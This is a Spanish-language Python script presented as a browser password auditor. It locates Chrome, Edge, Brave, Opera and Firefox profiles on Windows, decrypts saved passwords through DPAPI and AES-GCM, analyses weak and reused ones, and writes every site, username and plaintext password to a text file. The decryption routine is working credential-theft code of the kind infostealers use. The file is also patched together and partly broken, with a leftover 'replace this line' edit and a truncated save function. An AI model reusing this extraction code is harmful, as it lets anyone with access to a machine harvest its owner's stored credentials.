#!/usr/bin/env python3
"""
🔥 PASSWORD AUDITOR COMPLETO - AUTO-INSTALABLE
¡COPIA TODO ESTE ARCHIVO Y EJECUTA!
"""

import os
import sys
import subprocess
import shutil
import tempfile
import base64
import json
from pathlib import Path

# ================================ TU CÓDIGO ORIGINAL ================================
# [IMPORTS Y CLASE PasswordAuditor COMPLETA - PEGADA TAL CUAL]

import sqlite3
from datetime import datetime
import glob

try:
    import win32crypt
    from Crypto.Cipher import AES
    WINDOWS = True
except ImportError:
    WINDOWS = False

class PasswordAuditor:
    def __init__(self):
        self.all_passwords = []
        self.stats = {
            'total': 0,
            'by_browser': {},
            'weak_passwords': 0,
            'reused_passwords': 0
        }
    
    # ================== DETECCIoN DE NAVEGADORES ==================
    
    def find_all_browsers(self):
        """Encuentra todos los navegadores instalados"""
        browsers = []
        
        if os.name == 'nt':  # Windows
            browsers.extend(self._find_windows_browsers())
        
        return browsers
    
    def _find_windows_browsers(self):
        """Busca navegadores en Windows"""
        browsers_found = []
        appdata_local = os.environ.get('LOCALAPPDATA', '')
        appdata_roaming = os.environ.get('APPDATA', '')
        
        # Definir todos los navegadores y sus rutas
        browser_paths = [
            # Chrome y derivados
            {
                'name': 'Google Chrome',
                'paths': [
                    os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'),
                    os.path.join(appdata_roaming, 'Google', 'Chrome', 'User Data')
                ],
                'login_file': 'Login Data',
                'state_file': 'Local State',
                'profiles': ['Default'] + [f'Profile {i}' for i in range(1, 10)]
            },
            {
                'name': 'Microsoft Edge',
                'paths': [
                    os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'),
                    os.path.join(appdata_local, 'Microsoft Edge', 'User Data')
                ],
                'login_file': 'Login Data',
                'state_file': 'Local State',
                'profiles': ['Default'] + [f'Profile {i}' for i in range(1, 10)]
            },
            {
                'name': 'Brave',
                'paths': [
                    os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
                    os.path.join(appdata_roaming, 'BraveSoftware', 'Brave-Browser', 'User Data')
                ],
                'login_file': 'Login Data',
                'state_file': 'Local State',
                'profiles': ['Default'] + [f'Profile {i}' for i in range(1, 10)]
            },
            {
                'name': 'Vivaldi',
                'paths': [
                    os.path.join(appdata_local, 'Vivaldi', 'User Data'),
                    os.path.join(appdata_roaming, 'Vivaldi', 'User Data')
                ],
                'login_file': 'Login Data',
                'state_file': 'Local State',
                'profiles': ['Default'] + [f'Profile {i}' for i in range(1, 10)]
            },
            # Opera y derivados
            {
                'name': 'Opera',
                'paths': [
                    os.path.join(appdata_roaming, 'Opera Software', 'Opera Stable'),
                    os.path.join(appdata_local, 'Opera Software', 'Opera Stable')
                ],
                'login_file': 'Login Data',
                'state_file': 'Local State',
                'profiles': ['Default']
            },
            {
                'name': 'Opera GX',
                'paths': [
                    os.path.join(appdata_local, 'Opera Software', 'Opera GX Stable'),
                    os.path.join(appdata_roaming, 'Opera Software', 'Opera GX Stable')
                ],
                'login_file': 'Login Data',
                'state_file': 'Local State',
                'profiles': ['Default']
            },
            # Firefox (diferente estructura)
            {
                'name': 'Mozilla Firefox',
                'paths': [
                    os.path.join(appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
                    os.path.join(appdata_local, 'Mozilla', 'Firefox', 'Profiles')
                ],
                'login_file': 'logins.json',
                'state_file': 'key4.db',
                'profiles': [],  # Se detectan automaticamente
                'firefox': True
            },
            # Safari (si estuviera en Windows, raro)
            {
                'name': 'Safari',
                'paths': [
                    os.path.join(os.environ.get('APPDATA', ''), 'Apple Computer', 'Safari'),
                    os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Apple Computer', 'Safari')
                ],
                'login_file': 'Secured Preferences',
                'state_file': None,
                'profiles': []
            }
        ]
        
        # Buscar cada navegador
        for browser in browser_paths:
            for base_path in browser['paths']:
                if os.path.exists(base_path):
                    # Para Firefox, buscar perfiles
                    if browser.get('firefox'):
                        profiles = self._find_firefox_profiles(base_path)
                        for profile in profiles:
                            browsers_found.append({
                                'name': browser['name'],
                                'base_path': base_path,
                                'profile_path': profile['path'],
                                'profile_name': profile['name'],
                                'login_file': browser['login_file'],
                                'state_file': browser['state_file'],
                                'is_firefox': True
                            })
                    else:
                        # Para Chrome-based, buscar perfiles definidos
                        for profile in browser['profiles']:
                            profile_path = os.path.join(base_path, profile)
                            if os.path.exists(profile_path):
                                login_path = os.path.join(profile_path, browser['login_file'])
                                if os.path.exists(login_path):
                                    browsers_found.append({
                                        'name': browser['name'],
                                        'base_path': base_path,
                                        'profile_path': profile_path,
                                        'profile_name': profile,
                                        'login_file': browser['login_file'],
                                        'state_file': browser['state_file'],
                                        'is_firefox': False
                                    })
                        
                        # Tambien buscar perfiles no estandar
                        if os.path.exists(base_path):
                            for item in os.listdir(base_path):
                                item_path = os.path.join(base_path, item)
                                if os.path.isdir(item_path) and item.startswith('Profile '):
                                    login_path = os.path.join(item_path, browser['login_file'])
                                    if os.path.exists(login_path):
                                        browsers_found.append({
                                            'name': browser['name'],
                                            'base_path': base_path,
                                            'profile_path': item_path,
                                            'profile_name': item,
                                            'login_file': browser['login_file'],
                                            'state_file': browser['state_file'],
                                            'is_firefox': False
                                        })
        
        return browsers_found
    
    def _find_firefox_profiles(self, firefox_path):
        """Encuentra perfiles de Firefox"""
        profiles = []
        
        # Buscar archivo profiles.ini
        profiles_ini = os.path.join(firefox_path, 'profiles.ini')
        if os.path.exists(profiles_ini):
            try:
                with open(profiles_ini, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                
                current_profile = None
                for line in lines:
                    line = line.strip()
                    if line.startswith('[Profile'):
                        current_profile = {}
                    elif line.startswith('Name=') and current_profile is not None:
                        current_profile['name'] = line.split('=', 1)[1]
                    elif line.startswith('Path=') and current_profile is not None:
                        current_profile['path'] = line.split('=', 1)[1]
                        # Convertir path relativo a absoluto
                        if not os.path.isabs(current_profile['path']):
                            current_profile['path'] = os.path.join(firefox_path, current_profile['path'])
                        
                        # Verificar si tiene logins.json
                        logins_path = os.path.join(current_profile['path'], 'logins.json')
                        if os.path.exists(logins_path):
                            profiles.append(current_profile)
                        current_profile = None
            except:
                pass
        
        # Si no encontramos profiles.ini, buscar directorios que terminen en .default
        if not profiles:
            for item in os.listdir(firefox_path):
                if item.endswith('.default') or item.endswith('.default-release'):
                    profile_path = os.path.join(firefox_path, item)
                    logins_path = os.path.join(profile_path, 'logins.json')
                    if os.path.exists(logins_path):
                        profiles.append({
                            'name': item,
                            'path': profile_path
                        })
        
        return profiles
    
    # ================== DESCIFRADO ==================
    
    def decrypt_chrome_based(self, encrypted_password, local_state_path):
        """Descifra contrasenas de Chrome/Edge/Opera/Brave"""
        try:
            if not encrypted_password:
                return None
            
            # Metodo antiguo (DPAPI)
            if len(encrypted_password) > 0 and not encrypted_password.startswith(b'v10') and not encrypted_password.startswith(b'v11'):
                if WINDOWS:
                    return win32crypt.CryptUnprotectData(
                        encrypted_password, None, None, None, 0
                    )[1].decode('utf-8', errors='ignore')
                return None
            
            # Metodo AES-GCM (Chrome 80+)
            if not local_state_path or not os.path.exists(local_state_path):
                return None
            
            # Extraer componentes
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            
            # Obtener clave de Local State
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            if 'os_crypt' not in local_state:
                return None
            
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            # Remover prefijo DPAPI
            if encrypted_key.startswith(b'DPAPI'):
                encrypted_key = encrypted_key[5:]
            
            # Descifrar clave maestra
            # REEMPLAZA ESTA LÍNEA (línea ~180 en tu código):
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            # CON ESTO:
            if encrypted_key.startswith(b'DPAPI'):
                # Edge usa DPAPI + flags (01000000 = CRYPTPROTECT_UI_FORBIDDEN)
                if len(encrypted_key) >= 9:
                    flags = int.from_bytes(encrypted_key[5:9], 'little')
                    actual_data = encrypted_key[9:]
                    key = win32crypt.CryptUnprotectData(actual_data, None, None, None, flags)[1]
                else:
                    actual_data = encrypted_key[5:] if len(encrypted_key) > 5 else encrypted_key
                    key = win32crypt.CryptUnprotectData(actual_data, None, None, None, 1)[1]
            else:
                # Chrome/Opera normal
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 1)[1]
                        
            # Descifrar contrasena
            cipher = AES.new(key, AES.MODE_GCM, nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
            
        except Exception as e:
            print(f"  ⚠️  Error descifrando Chrome-based: {e}")
            return None
    
    def decrypt_firefox(self, encrypted_data, profile_path):
        """Descifra contrasenas de Firefox (MUCHO mas complejo)"""
        print(f"  ⚠️  Firefox requiere NSS/MozTools para descifrado")
        print(f"  💡 Usa: https://github.com/Unode/firefox_decrypt")
        return None
    
    # ================== EXTRACCIoN ==================
    
    def extract_browser_passwords(self, browser_info):
        """Extrae contrasenas de un navegador especifico"""
        print(f"\n🔍 Analizando: {browser_info['name']} - {browser_info['profile_name']}")
        
        passwords = []
        
        try:
            if browser_info.get('is_firefox'):
                # Firefox
                logins_path = os.path.join(browser_info['profile_path'], 'logins.json')
                key4db_path = os.path.join(browser_info['profile_path'], 'key4.db')
                
                if not os.path.exists(logins_path):
                    print("  ❌ No se encontro logins.json")
                    return []
                
                with open(logins_path, 'r', encoding='utf-8') as f:
                    firefox_data = json.load(f)
                
                for login in firefox_data.get('logins', []):
                    encrypted_password = base64.b64decode(login['encryptedPassword'])
                    password = self.decrypt_firefox(encrypted_password, browser_info['profile_path'])
                    
                    if password:
                        passwords.append({
                            'browser': browser_info['name'],
                            'profile': browser_info['profile_name'],
                            'url': login.get('hostname', ''),
                            'username': login.get('encryptedUsername', ''),
                            'password': password,
                            'notes': login.get('notes', '')
                        })
            
            else:
                # Chrome-based browsers
                login_path = os.path.join(browser_info['profile_path'], browser_info['login_file'])
                state_path = os.path.join(browser_info['base_path'], browser_info['state_file']) if browser_info['state_file'] else None
                
                if not os.path.exists(login_path):
                    print(f"  ❌ No se encuentra {browser_info['login_file']}")
                    return []
                
                # Crear copia temporal (el archivo esta bloqueado por el navegador)
                temp_db = "temp_browser_passwords.db"
                try:
                    shutil.copy2(login_path, temp_db)
                except PermissionError:
                    print(f"  ❌ El navegador podria estar abierto. Cierralo y reintenta.")
                    return []
                
                # Conectar a la base de datos
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Intentar diferentes estructuras de tabla
                tables_to_try = [
                    "SELECT origin_url, username_value, password_value FROM logins",
                    "SELECT url, username, password FROM logins",
                    "SELECT action_url, username_value, password_value FROM logins"
                ]
                
                rows = []
                for query in tables_to_try:
                    try:
                        cursor.execute(query)
                        rows = cursor.fetchall()
                        if rows:
                            break
                    except sqlite3.Error:
                        continue
                
                conn.close()
                
                print(f"  📊 Encontradas {len(rows)} entradas en DB")
                
                # Descifrar cada contrasena
                decrypted_count = 0
                for row in rows:
                    if len(row) >= 3:
                        url = row[0] or ''
                        username = row[1] or ''
                        encrypted_password = row[2]
                        
                        if encrypted_password:
                            password = self.decrypt_chrome_based(encrypted_password, state_path)
                            
                            if password:
                                passwords.append({
                                    'browser': browser_info['name'],
                                    'profile': browser_info['profile_name'],
                                    'url': url,
                                    'username': username,
                                    'password': password,
                                    'notes': ''
                                })
                                decrypted_count += 1
                
                print(f"  ✅ {decrypted_count} contrasenas descifradas")
                
                # Limpiar archivo temporal
                if os.path.exists(temp_db):
                    os.remove(temp_db)
        
        except Exception as e:
            print(f"  ❌ Error procesando {browser_info['name']}: {e}")
        
        return passwords
    
    # ================== ANaLISIS DE SEGURIDAD ==================
    
    def analyze_passwords(self):
        """Analiza la seguridad de las contrasenas encontradas"""
        print("\n" + "="*60)
        print("🔐 ANaLISIS DE SEGURIDAD DE CONTRASEnAS")
        print("="*60)
        
        if not self.all_passwords:
            print("❌ No hay contrasenas para analizar")
            return
        
        # Estadisticas por navegador
        browser_stats = {}
        for pw in self.all_passwords:
            browser = pw['browser']
            browser_stats[browser] = browser_stats.get(browser, 0) + 1
        
        print(f"\n📊 DISTRIBUCIoN POR NAVEGADOR:")
        for browser, count in browser_stats.items():
            print(f"  {browser}: {count} contrasenas")
        
        # Contrasenas debiles
        weak_criteria = [
            lambda p: len(p) < 8,
            lambda p: p.isdigit(),
            lambda p: p.isalpha(),
            lambda p: p.lower() in ['password', '123456', 'qwerty', 'admin', 'welcome']
        ]
        
        weak_passwords = []
        for pw in self.all_passwords:
            password = pw['password']
            for criterion in weak_criteria:
                if criterion(password):
                    weak_passwords.append(pw)
                    break
        
        # Contrasenas repetidas
        password_to_sites = {}
        for pw in self.all_passwords:
            pwd = pw['password']
            if pwd not in password_to_sites:
                password_to_sites[pwd] = []
            password_to_sites[pwd].append(pw['url'])
        
        reused_passwords = {pwd: sites for pwd, sites in password_to_sites.items() if len(sites) > 1}
        
        # Actualizar estadisticas
        self.stats['total'] = len(self.all_passwords)
        self.stats['by_browser'] = browser_stats
        self.stats['weak_passwords'] = len(weak_passwords)
        self.stats['reused_passwords'] = len(reused_passwords)
        
        # Mostrar resultados
        if weak_passwords:
            print(f"\n🚨 CONTRASEnAS DeBILES ENCONTRADAS ({len(weak_passwords)}):")
            for pw in weak_passwords[:10]:  # Mostrar solo las primeras 10
                print(f"  • {pw['url'][:50]}... - Usuario: {pw['username']} - Contrasena: {pw['password']}")
            if len(weak_passwords) > 10:
                print(f"  ... y {len(weak_passwords) - 10} mas")
        
        if reused_passwords:
            print(f"\n⚠️  CONTRASEnAS REUTILIZADAS ({len(reused_passwords)}):")
            for pwd, sites in list(reused_passwords.items())[:5]:
                print(f"  • Contrasena '{pwd}' usada en {len(sites)} sitios:")
                for site in sites[:3]:
                    print(f"    - {site[:60]}...")
                if len(sites) > 3:
                    print(f"    ... y {len(sites) - 3} mas")
        
        # Recomendaciones
        print(f"\n💡 RECOMENDACIONES:")
        print(f"  1. Cambia {len(weak_passwords)} contrasenas debiles INMEDIATAMENTE")
        print(f"  2. Deja de reutilizar {len(reused_passwords)} contrasenas")
        print(f"  3. Usa un gestor de contrasenas (Bitwarden, 1Password)")
        print(f"  4. Activa autenticacion de dos factores (2FA)")
        print(f"  5. Considera usar una contrasena maestra en tu navegador")
    
    # ================== EXPORTACIoN ==================
    
    def save_results(self):
        """Guarda todos los resultados en archivos"""
        if not self.all_passwords:
            print("❌ No hay resultados para guardar")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Archivo completo (¡CUIDADO! MUY SENSIBLE)
        full_file = f"all_passwords_audit_{timestamp}.txt"
        with open(full_file, 'w', encoding='utf-8') as f:
            f.write("="*80 + "\n")
            f.write("🔐 AUDITORiA COMPLETA DE CONTRASEnAS - ARCHIVO SENSIBLE\n")
            f.write("="*80 + "\n\n")
            f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total contrasenas encontradas: {len(self.all_passwords)}\n\n")
            
            for i, pw in enumerate(self.all_passwords, 1):
                f.write(f"[{i}] {pw['browser']} ({pw['profile']})\n")
                f.write(f"    URL: {pw['url']}\n")
                f.write(f"    Usuario: {pw['username']}\n")
                f.write(f"    Contrasena: {pw['password']}\n")
                
                # Marcador de seguridad
                if len(pw['password']) < 8:
                    f.write(f"    ⚠️  CONTRASEnA DeBIL (solo {len(pw['password'])} caracteres)\n")
                
                f.write("-"*60 + "\n")
            
            f.write("\n" + "="*80 + "\n")
            f.write("⚠️  ADVERTENCIA DE SEGURIDAD:\n")
            f.write("1. Este archivo contiene informacion EXTREMADAMENTE sensible\n")
            f.write("2. Revisalo OFFLINE (sin conexion a internet)\n")
            f.write("3. Eliminalo inmediatamente despues de usarlo\n")
            f.write("4. Usa Shift+Delete para borrado permanente\n")
            f.write("="*80 + "\n")
        
        # Archivo de resumen (sin contrasenas)
def main():
    print("="*80)
    print("🔐 AUDITORiA COMPLETA DE SEGURIDAD DE NAVEGADORES")
    print("="*80)
    print("\n⚠️  ADVERTENCIA: Este script revela cuan vulnerables son tus contrasenas")
    print("   si alguien accede fisicamente a tu PC o instala malware.\n")
    
    # Verificar dependencias
    if WINDOWS:
        try:
            import win32crypt
            from Crypto.Cipher import AES
        except ImportError:
            print("❌ Faltan dependencias. Instala con:")
            print("   pip install pywin32 pycryptodome")
            return
    
    # Confirmar
    respuesta = input("¿Continuar con la auditoria? (s/N): ").strip().lower()
    if respuesta != 's':
        print("Auditoria cancelada.")
        return
    
    # Iniciar auditoria
    auditor = PasswordAuditor()
    
    print("\n🔍 Buscando todos los navegadores instalados...")
    browsers = auditor.find_all_browsers()
    
    if not browsers:
        print("❌ No se encontraron navegadores con contrasenas guardadas")
        return
    
    print(f"\n✅ Encontrados {len(browsers)} perfil(es) de navegador:")
    for i, browser in enumerate(browsers, 1):
        print(f"  {i}. {browser['name']} - {browser['profile_name']}")
    
    # Preguntar cuales analizar
    print("\n¿Que navegadores quieres auditar?")
    print("  1. Todos (recomendado para auditoria completa)")
    print("  2. Seleccionar manualmente")
    
    choice = input("Opcion (1/2): ").strip()
    
    if choice == '2':
        print("\nIntroduce los numeros separados por comas (ej: 1,3,5):")
        selected_indices = input("> ").strip()
        try:
            indices = [int(i.strip())-1 for i in selected_indices.split(',')]
            selected_browsers = [browsers[i] for i in indices if 0 <= i < len(browsers)]
        except:
            print("❌ Seleccion no valida. Analizando todos.")
            selected_browsers = browsers
    else:
        selected_browsers = browsers
    
    # Extraer contrasenas de cada navegador seleccionado
    print(f"\n📋 Analizando {len(selected_browsers)} perfil(es)...")
    
    for browser in selected_browsers:
        passwords = auditor.extract_browser_passwords(browser)
        auditor.all_passwords.extend(passwords)
    
    # Analizar resultados
    if auditor.all_passwords:
        auditor.analyze_passwords()
        full_file = auditor.save_results()
        
        print("\n" + "="*80)
        print("🎯 AUDITORiA COMPLETADA")
        print("="*80)
        print(f"\n📈 RESULTADOS FINALES:")
        print(f"  • Total contrasenas encontradas: {auditor.stats['total']}")
        print(f"  • En {len(auditor.stats['by_browser'])} navegadores diferentes")
        print(f"  • {auditor.stats['weak_passwords']} contrasenas DeBILES")
        print(f"  • {auditor.stats['reused_passwords']} contrasenas REUTILIZADAS")
        
        print(f"\n⚠️  ADVERTENCIA CRiTICA:")
        print(f"  Cualquiera con acceso a tu PC puede obtener estas {auditor.stats['total']} contrasenas")
        print(f"  en minutos, sin necesidad de tu contrasena de Windows.")
        
        print(f"\n🚨 ACCIONES INMEDIATAS:")
        print(f"  1. ELIMINA el archivo '{full_file}' (contiene todas tus contrasenas)")
        print(f"  2. Cambia las {auditor.stats['weak_passwords']} contrasenas debiles")
        print(f"  3. Instala Bitwarden (gratis) para gestionar contrasenas seguras")
        print(f"  4. Activa Windows Hello o contrasena de arranque")
        
        print(f"\n💾 Archivos generados:")
        
    else:
        print("\n✅ No se encontraron contrasenas almacenadas en navegadores.")
        print("   ¡Buen trabajo manteniendo limpios tus navegadores!")

if __name__ == "__main__":
    main()